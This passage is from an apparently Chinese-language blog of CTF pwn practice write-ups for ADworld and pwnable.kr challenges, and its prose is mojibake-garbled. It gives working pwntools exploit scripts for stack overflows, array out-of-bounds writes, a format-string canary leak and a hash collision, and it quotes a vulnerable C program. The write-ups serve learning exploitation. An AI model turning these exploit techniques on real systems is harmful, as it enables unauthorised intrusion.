alt="image-20200609105624424"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105703718.png" alt="image-20200609105703718"></p><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢2æ¬¡çš„åœ°å€åˆ†åˆ«ä¸º<strong>0xffffd01c</strong> <strong>0xffffcf98</strong> 2è€…ä¹‹å·®ä¸º<strong>0x84</strong>ï¼Œå³æˆ‘ä»¬è¦çš„åç§»ã€‚</p><p>å¼€å§‹å†™è„šæœ¬æ”»å‡»ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¾—åˆ°shellã€‚ã€‚ã€‚æ‰¾äº†ä¸€ä¼šå„¿é”™è¯¯ï¼Œæ²¡å‘ç°ã€‚çœ‹äº†å…¶ä»–äººçš„writeupè¯´ç”±äºå‡ºé¢˜äººåŸå› ï¼Œç¯å¢ƒä¸­å¹¶æ²¡æœ‰bashï¼Œå¯ä»¥é€šè¿‡å·²æœ‰çš„ /bin/bashå¾—åˆ°shå­—ç¬¦ä¸²ï¼Œä½œä¸ºsystem()å‚æ•°æ‰è¡Œã€‚</p><p>ä¹Ÿå¾ˆå®¹æ˜“ï¼Œç›´æ¥æ‰¾åˆ°å­—ç¬¦ä¸²åœ°å€ï¼Œåˆ©ç”¨æ•°ç»„è¶Šç•Œå¤šæ”¹å˜æ ˆä¸­çš„ä¸€ä¸ªæ•°æ®ä¸º<strong>sh</strong>ä½œä¸ºsystem()çš„å‚æ•°å³å¯ã€‚exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">58409</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line">system_addr = [<span class="number">0xb4</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(offset))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+i, system_addr[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">write_(offset+<span class="number">4</span>+i, sh_addr[i])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609110724445.png" alt="image-20200609110724445"></p><p>æœ€åå…³äºè¿™ä¸ªé¢˜çš„æ ˆä»idaä¸­é™æ€çœ‹åˆ°æ ˆä¸å®é™…åŠ¨è°ƒä¸åŒçš„åŸå› ï¼Œçœ‹å¼€å¤´ä¸ç»“å°¾çš„æ±‡ç¼–ä»£ç å¯ä»¥çŸ¥é“ç­”æ¡ˆã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140544469.png" alt="image-20200610140544469"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140847175.png" alt="image-20200610140847175"></p><p><strong>æ€»ç»“ï¼š1.ä»è¿™ä¸ªé¢˜å‘ç°æ•°ç»„è¶Šç•Œå°±å¯ä»¥ç»•è¿‡canaryï¼Œä½†ä¹Ÿæ˜¯é¢˜æ•…æ„è®¾è®¡çš„è€Œå·²ã€‚2.é™æ€çœ‹åˆ°çš„æ ˆåˆ†å¸ƒäºå®é™…è¿è¡Œçš„å¯èƒ½ä¼šä¸åŒï¼Œè¿™é“é¢˜å°±æ˜¯ã€‚</strong></p><h3 id="forot"><a href="#forot" class="headerlink" title="forot"></a>forot</h3><blockquote><p>æ ˆæº¢å‡ºï¼Œå¤šäº†ä¼šå¯¹è¾“å…¥å­—ç¬¦è¿›è¡Œåˆ¤æ–­å¤šæ„é€ ä¸‹ã€‚ä½†æ˜¯å½“å¯¹æ•´ä¸ªmainå‡½æ•°è¿è¡Œå®Œååœ¨retå¤„æ§åˆ¶å…¶èµ°å‘å§‹ç»ˆä¸æˆåŠŸã€‚ã€‚ã€‚gdbè°ƒè¯•æ ˆçš„åç§»åå¤ç¡®å®šäº†çš„ï¼Œæ¯”åœ¨idaä¸­é™æ€çœ‹åˆ°çš„å¤§4ï¼Œä½†è¿™å¤šå‡ºæ¥çš„4å°±å¾ˆè¿·ã€‚ã€‚ã€‚æœ€åè§‰å¾—æ˜¯ç¨‹åºåœ¨å‡ºæ ˆæ—¶æœ‰ä¸€ä¸ªå€¼è¿˜åŸï¼Œæœ‰ç‚¹canaryçš„æ„æ€ï¼Œä½†æ˜¯ç¨‹åºæ²¡æœ‰å¼€canaryä¿æŠ¤å•Šã€‚æäº†å¾ˆä¹…è¿˜æ˜¯æ²¡å¼„æ¸…åŸå› ï¼Œåé¢çŸ¥è¯†ç§¯ç´¯å¤šäº†å†æ¥çœ‹çœ‹æ€ä¹ˆå›äº‹ã€‚ã€‚ã€‚</p></blockquote><p>åªå¼€äº†NXä¿æŠ¤ï¼Œidaä¸­çœ‹ä¸‹ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171656557.png" alt="image-20200610171656557"></p><p>å†çœ‹çœ‹æ ˆçš„æƒ…å†µã€‚æ‰¾åˆ°v3ä¸v2æ•°ç»„çš„åœ°å€ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171941539.png" alt="image-20200610171941539"></p><p>å†çœ‹åˆ°ç¨‹åºä¸­ç›´æ¥æœ‰systemå‡½æ•°åŠå­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯æ”¹å˜å‡½æ•°æŒ‡é’ˆå¹¶æ§åˆ¶v14çš„å€¼ï¼Œæ„é€ å…¶æ‰§è¡Œæˆ‘ä»¬çš„systemï¼ˆï¼‰å‡½æ•°ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172311560.png" alt="image-20200610172311560"></p><p>å†™è„šæœ¬æ”»å‡»ã€‚è¿™é‡Œæ–¹æ³•ä¹Ÿå¾ˆå¤šå§ï¼Œåªè¦æ„é€ é…åˆå¥½å°±å¯ä»¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">39422</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486D2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'Bxnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172459341.png" alt="image-20200610172459341"></p><p><strong>æ€»ç»“ï¼š1.è¿˜æ˜¯æ ˆæº¢å‡ºï¼Œä½†ä¸æ˜¯é€šè¿‡æ”¹å˜å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè§è¯†æ›´å¤šäº†å§ã€‚2.\x09ä¸\xaæ˜¯åå­—ç¬¦ï¼Œå½“è¯»åˆ°è¿™2ä¸ªå­—ç¬¦çš„æ—¶å€™ä¼šæˆªæ–­ã€‚</strong></p><h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><blockquote><p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ‰¾åˆ°canaryåæ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘ã€‚ä½†æ˜¯ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å› ä¸ºå¼€å§‹ä½¿ç”¨çš„recvuntil(â€˜â€™)æ²¡æœ‰æ³¨æ„<strong>â€˜\nâ€™</strong>å¯¼è‡´åé¢ç›´æ¥ä½¿ç”¨recv()å¼€å§‹åªèƒ½æ¥æ”¶åˆ°<strong>â€™\nâ€™</strong>ï¼ŒèŠ±äº†å¥½å¤šæ—¶é—´å¡åœ¨è¿™é‡Œã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ç®—æ•™è®­äº†ã€‚</p></blockquote><p>é™¤äº†PIEå…¶ä»–ä¿æŠ¤å…¨å¼€ã€‚è¿è¡Œçœ‹ä¸€ä¸‹ï¼Œè®©é€‰æ‹©æ˜¯æ ˆæº¢å‡ºè¿˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ idaä¸­çœ‹çœ‹ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611162320998.png" alt="image-20200611162320998"></p><p>è™½ç„¶æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œä½†ä¹Ÿæ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ˜¯è®©æˆ‘ä»¬æ³„éœ²canaryç”¨çš„ï¼ŒçŸ¥é“çš„canaryå°±å¯ä»¥å¿«ä¹çš„æ ˆæº¢å‡ºäº†ã€‚</p><p>é‚£å‰©ä¸‹çš„å°±éƒ½æ˜¯å¸¸è§„æ“ä½œäº†ï¼Œè„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53667</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">canary = int(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(canary) + <span class="number">8</span>*<span class="string">'a'</span> + p64(<span class="number">0x00000000004008DA</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>é—®é¢˜æ¥äº†ã€‚ã€‚ã€‚æ— è®ºæ€ä¹ˆæ”¹<strong>canary = int(p.recv(), 16)</strong>æ¥å—å±å¹•æ‰“å°å‡ºçš„å­—ç¬¦è¿™å¥è¯éƒ½æŠ¥é”™ã€‚ã€‚ã€‚2ä¸ªå¤šå°æ—¶è€—åœ¨è¿™é‡Œã€‚ã€‚ã€‚åé¢å°±è¯•äº†è¯•å…ˆ<strong>p.recvuntil(â€˜0xâ€™)</strong>ï¼ŒæˆåŠŸäº†ã€‚ã€‚ã€‚ä½†è‡ªå·±è¿˜æ˜¯å¾ˆéƒé—·ã€‚ã€‚ã€‚åˆç»§ç»­æ‰¾åŸå› ï¼Œæœ€åæ‰å‘ç°<strong>p.recvuntil(â€˜3. Exit the battle â€˜)</strong>ä¸­å°‘äº† <strong>\n</strong>ï¼Œå¯¼è‡´åé¢ç›´æ¥recv()æ¥å—åˆ°çš„éƒ½æ˜¯å›è½¦ï¼Œè¿˜æ˜¯recvuntil()ä¿éšœã€‚ã€‚ã€‚</p><p>åŠ ä¸Šåå†æ”»å‡»ï¼ŒæˆåŠŸã€‚ã€‚ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611163417332.png" alt="image-20200611163417332"></p><p>æ€»ç»“ï¼š1.è¿˜æ˜¯å¤šç”¨recvuntilå§ï¼Œä¿éšœäº›ã€‚2.æ³¨æ„ä½¿ç”¨recvuntilæ—¶ä¸­çš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«åˆ°æœ€åã€‚3.RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚</p><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><blockquote><p>ADworldæ²¡æœ‰ç»™é¢˜ç›®é™„ä»¶ï¼Œæœ€åçœ‹äº†çœ‹åˆ«äººå‘çš„idaä¼ªä»£ç ï¼Œå°±åªæ˜¯ç®€å•çš„æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘ã€‚</p></blockquote><p>é¢˜ç›®å¼€å¤´å°±ç»™äº†ä¸€ä¸ªåœ°å€ï¼Œåé¢åˆæ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼ŒçŒœä¹Ÿå¯çŒœåˆ°æ˜¯å°†å‡½æ•°è¿”å›åœ°å€è¦†ç›–ä¸ºç»™å‡ºçš„åœ°å€ã€‚</p><p>è„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">37196</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200612101533939.png" alt="image-20200612101533939"></p><h2 id="pwnable"><a href="#pwnable" class="headerlink" title="pwnable"></a>pwnable</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>é¢˜ç›®æè¿°ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151159958.png" alt="image-20200603151159958"></p><p>é€šè¿‡sshè¿æ¥åï¼Œæœ‰3ä¸ªæ–‡ä»¶ï¼Œflagæ²¡æœ‰æƒé™æŸ¥çœ‹ï¼Œé‚£å°±çœ‹ fd.c</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151520348.png" alt="image-20200603151520348"></p><p>ç”±äºreadå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ0ï¼šæ ‡å‡†è¾“å…¥ï¼›1ï¼šæ ‡å‡†è¾“å‡ºï¼›2ï¼šæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚é‚£è¿™é‡Œåªè¦æ ·fdç­‰äº0å°±å¥½äº†ã€‚</p><p>ç›´æ¥è®©è¾“å…¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 4,660(0x1234)ï¼Œæ¥ç€å†è¾“å…¥ LETMEWIN å¾—åˆ°flagã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152007549.png" alt="image-20200603152007549"></p><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote><p>å­¦ä¹ äº†æ ˆæº¢å‡ºååšè¿™ä¸ªé¢˜æ­£åˆé€‚</p></blockquote><p>å¾—åˆ°é¢˜ç›®çš„elfæ–‡ä»¶åidaæ‰“å¼€ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152328450.png" alt="image-20200603152328450"></p><p>å†åˆ©ç”¨idaä¸­å¾ˆå¥½çš„æ ˆæ˜¾ç¤ºï¼Œè®¡ç®—å¾—åˆ°éœ€è¦å¡«å……å¤§å° 0x34 ã€‚</p><p>å†™pyè„šæœ¬ï¼Œæ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x34</span>*<span class="string">'a'</span> + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(message)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152657713.png" alt="image-20200603152657713"></p><p><strong>æ€»ç»“ï¼šä»åŸºç¡€çš„æº¢å‡ºå¼€å§‹ï¼Œæ…¢æ…¢è¿›æ­¥ã€‚</strong></p><h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><p>é¢˜ç›®æè¿°ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090406828.png" alt="image-20200605090406828"></p><p>sshè¿æ¥åå‘ç°å°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥20ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç„¶åè½¬åŒ–ä¸º5ä¸ª4å­—èŠ‚æ•°æ®çš„å€¼ç›¸åŠ ä¸º0x21DD09ECã€‚</p><p>é‚£å°±ç›´æ¥å‡‘äº†ï¼Œå¼€å§‹ç›´æ¥æƒ³çš„æ˜¯è¾“å…¥16ä¸ª0åŠ ä¸€ä¸ªåŸæ•°æ®ï¼Œä½†å­—ç¬¦ä¸²è®¡ç®—é•¿åº¦æ—¶å°±ä¼šè¿‡ä¸äº†ã€‚é‚£å‡‘å¾—æ–¹æ³•ä¹Ÿå¾ˆå¤šï¼Œåªæ˜¯æ€æ ·å°†ä¸å¯æ‰“å°å­—ç¬¦è¾“å…¥ç»ˆç«¯ï¼ŒçŸ¥é“å¯ä»¥ä½¿ç”¨pythonçš„å•è¡Œæ‰§è¡Œè„šæœ¬å‘¢ -cã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090938145.png" alt="image-20200605090938145"></p><p>å¦å¤–å…¶å®ä¸€ç›´æƒ³ç”¨è„šæœ¬ç›´æ¥å®ç°ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œç½‘ä¸Šæœç„¶æœ‰ï¼Œå­¦ä¹ äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span> + p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'col'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p.connected()</span><br><span class="line"></span><br><span class="line">p1 = p.process(argv=[<span class="string">'col'</span>, s], executable=<span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> p1.recv()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092003637.png" alt="image-20200605092003637"></p><p><strong>æ€»ç»“ï¼š1.åˆ©ç”¨pythonå•è¡Œè„šæœ¬è¾“å…¥ä¸æ‰“å°å­—ç¬¦æ•°æ®ã€‚2.åˆ©ç”¨è„šæœ¬å¯¹sshè¿æ¥å¹¶äº¤äº’çš„æ–¹æ³•ã€‚3.å“ˆå¸Œç¢°æ’çš„æ¦‚å¿µã€‚</strong></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>æŸ¥çœ‹ä¿æŠ¤çš„æ—¶å€™å‘ç°äº†upxå£³ï¼Œè„±å£³åè½½å…¥idaå³å¯å‘ç°flagã€‚</p><p>æ€»ç»“ï¼šæ— ã€‚</p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote><p>åˆ©ç”¨scanf()å‡½æ•°ä¸­æ²¡åŠ å–å€ç¬¦&amp;å­˜åœ¨çš„æ¼æ´ï¼Œè¦†å†™gotè¡¨æ¥è¾¾åˆ°æ§åˆ¶ç¨‹åºèµ°å‘çš„ç›®çš„ã€‚</p></blockquote><p>é¢˜ç›®æè¿°ã€‚</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608181103998.png" alt="image-20200608181103998"></p><p>è¿æ¥åæŸ¥çœ‹passcode.cæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°scanf()æ˜¯æ²¡æœ‰åŠ å–åœ°å€ç¬¦çš„ï¼Œæƒ³é€šè¿‡è¾“å…¥è¾¾åˆ°ç›®çš„è‚¯å®šä¼šæŠ¥é”™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†çœ‹åˆ°welcomeï¼ˆï¼‰å‡½æ•°ï¼Œscanf(â€œ%100sâ€, name)å¯¹è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦è¿›è¡Œäº†é™åˆ¶ï¼Œæƒ³é€šè¿‡æº¢å‡ºæ˜¯ä¸è¡Œäº†ã€‚</p><p>æ—¢ç„¶ç¨‹åºå‡ºäº†é—®é¢˜æ˜¯æ²¡åŠ å–å€ç¬¦ï¼Œé‚£çªç ´å£è‚¯å®šå°±åœ¨å“ªé‡Œã€‚åˆæ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡åˆ°çš„æ¼æ´ç±»å‹ï¼Œç”±äºscanf(â€œ%dâ€, passcode1)ä¸­passcode1æ²¡åŠ å–åœ°å€ç¬¦ï¼Œå°†ä¼šæŠŠpasscode1æœ¬èº«çš„å€¼ä½œä¸ºåœ°å€ç„¶åå‘å…¶å†™å…¥æ•°æ®ã€‚å¹¶ä¸”è¿™ä¸ªpasscode1æ²¡æœ‰åˆå§‹åŒ–ï¼Œæ‰€ä»¥å®ƒçš„é»˜è®¤çš„å€¼å°†æ˜¯ä¸Šæ¬¡æ ˆä¸­ç•™ä¸‹æ¥çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ä¸Šæ¬¡å‘æ ˆä¸­å†™çš„æ•°æ®ï¼Œä½¿scanfï¼ˆï¼‰ä¸­çš„åœ°å€æ˜¯æˆ‘ä»¬å‘è¾“å…¥æ•°æ®çš„åœ°å€ã€‚</p><blockquote><p>çŸ¥è¯†ç‚¹ï¼šåœ¨welcomeï¼ˆï¼‰å‡½æ•°ç»“æŸåï¼Œè™½ç„¶å®ƒä¼š<strong>push esp, ebpï¼›pop ebpï¼›ret</strong>è¿›è¡Œä¸€ä¸ªå †æ ˆå¹³è¡¡ï¼Œä½†æ˜¯åªæ˜¯æ”¹å˜äº†espå¯„å­˜å™¨çš„å€¼ï¼Œæ ˆä¸­çš„å†…å®¹æ²¡æœ‰è¿›è¡Œæ¸…ç†ï¼Œå¦‚æœä¸‹æ¬¡ä½¿ç”¨åŒä¸€ä¸ªæ 